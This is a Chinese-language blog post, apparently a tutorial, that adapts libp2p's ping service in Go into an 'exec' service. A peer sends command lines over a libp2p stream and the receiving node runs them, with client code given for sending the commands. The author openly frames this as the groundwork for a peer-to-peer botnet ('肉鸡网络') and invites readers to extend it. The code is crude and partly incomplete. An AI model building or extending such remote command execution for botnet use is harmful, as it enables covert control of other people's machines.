# 使用 libp2p 来实现一个肉鸡网络

前面已经做了一个libp2p的helloworld,比较简单，实现了ping功能。

我们先读代码，再实现一个自己的服务，建立一个p2p的肉鸡网络

## 读代码
前面的代码是通过，使用libp2p内置的 ping服务来完成的。
通过遇到ping的代码，我们可以知道如果定义一个服务。

```
const (
	PingSize    = 32
	pingTimeout = time.Second * 60

	ID = "/ipfs/ping/1.0.0"

	ServiceName = "libp2p.ping"
)

type PingService struct {
	Host host.Host
}
func NewPingService(h host.Host) *PingService {
    ps := &PingService{h}
    h.SetStreamHandler(ID, ps.PingHandler) //id 为协议名，注册一个StreamHander函数来处理收到的请求
    return ps
}
```
### PingHandler 处理
定义如下
```
func (p *PingService) PingHandler(s network.Stream) {
	for { //忽略了前面部分代码
		_, err := io.ReadFull(s, buf)
		if err != nil {
			errCh <- err
			return
		}

		_, err = s.Write(buf)
		if err != nil {
			errCh <- err
			return
		}

		timer.Reset(pingTimeout)
	}
}
```
读代码可以知道，PingHandler建立循环读stream数据，读到什么就写回什么。
### 发起ping
```
func Ping(ctx context.Context, h host.Host, p peer.ID) <-chan Result {
    s, err := h.NewStream(network.WithUseTransient(ctx, "ping"), p, ID)
    if err != nil {
        return pingError(err)
    }
    go func() {
		defer close(out)
		defer cancel()

		for ctx.Err() == nil {
			var res Result
			res.RTT, res.Error = ping(s) //调用ping函数
}
func ping(s network.Stream) (time.Duration, error) {
    buf := pool.Get(PingSize)
	defer pool.Put(buf)

	u.NewTimeSeededRand().Read(buf)

	before := time.Now()
	_, err := s.Write(buf)
	if err != nil {
		return 0, err
	}

	rbuf := pool.Get(PingSize)
	defer pool.Put(rbuf)
	_, err = io.ReadFull(s, rbuf)
	if err != nil {
		return 0, err
	}
}
```
建立流，等待发起ping 的chan 信号，调用ping
ping函数为产生随机字符串，通过流发出来到ping的host,再收到字符串比较。

## 依葫芦画个瓢

### 定义相关id,服务名
```
const (
	ID = "/ipfs/exec/1.0.0"
	ServiceName = "libp2p.exec"
)

type ExecService struct {
	Host host.Host
}

func NewExecService(h host.Host) *ExecService {
	ps := &ExecService{h}
	h.SetStreamHandler(ID, ps.ExecHandler) //这里id是上面 /ipfs/exec/1.0.0
	return ps
}
```
我们建立一个exec服务，通过连接节点输入 命令行，执行命令返回运行结果。
### exec 命令处理
```
func (p *ExecService) ExecHandler(s network.Stream) {
	sreader := bufio.NewReader(s)
	for {
		linestr, _ := sreader.ReadString('\n')
		linestr = strings.TrimSpace(linestr)
		if len(linestr) > 0 {
			cmds := strings.Split(linestr, " ")
			cmd := exec.Command(cmds[0])
			stdout, err := cmd.Output()
			if err != nil {
				println(err.Error())
			}
			println(string((stdout)))
		}
	}
}
```
为了方便处理，我们这里实现的telnet,redis服务器里面的常用命令行处理方式，"\n"表示命令行结束
我这里并没有把结果write回去，如果要弄还是参考前面的ping服务就可以。

### 发起 exec调用

1. 建立流
2. 等待命令行
3. 发送命令行到连接node
4. 收到命令行处理结果
```
func (ps *ExecService) ExecStart(ctx context.Context, p peer.ID, cmd chan string) <-chan string {
	s, err := ps.Host.NewStream(network.WithUseTransient(ctx, "exec"), p, ID)
	if err != nil {
		return execError(err)
	}
	if err := s.Scope().SetService(ServiceName); err != nil {
		//log.Debugf("error attaching stream to ping service: %s", err)
		s.Reset()
		return execError(err)
	}

	ctx, cancel := context.WithCancel(ctx)

	out := make(chan string, 1)
	go func() {
		defer close(out)
		defer cancel()
		select {
		case cmdstr := <-cmd: //等待命令行
			doexec(s, cmdstr)  //发送命令行到节点
		case <-ctx.Done():
			return
		}
	}()
	return out
}

func doexec(s network.Stream, cmd string) (int, error) {
	sreader := bufio.NewReader(s)
	_, err := s.Write([]byte(cmd)) //写命令行到 节点的 stream
	_, err = sreader.ReadString('\n')
	if err != nil {
		return 0, err
	}
	return 0, nil
}
```
在使用的时候我们这样用
```
    ps := p001.NewExecService(node) 
	cmdch := make(chan string, 1)
	ch := ps.ExecStart(context.Background(), info.ID, cmdch) //对方的p2paddr,接受命令的chan
	cmdch <- "go\n"   //发送命令行，在真实的应用中需要在while里面根据输入发送
	result := <-ch
	fmt.Println("recv", result) 
```
好了，这样一个简单exec服务的演示就完成了。

上面的代码，只是代码演示，如需使用可以自己在上面的基础上面进行修改。
理论上，一个建立p2p肉鸡网络的技术细节都有了，还有一些体力活需要干。



代码提交到了github，
[golang use libp2p](https://github.com/daodao2007/p001) 详细的可以看代码

参考文档：
[docs.libp2p.io](https://docs.libp2p.io/tutorials/getting-started/go/)
[官方 golang examples](https://github.com/libp2p/go-libp2p/tree/master/examples)
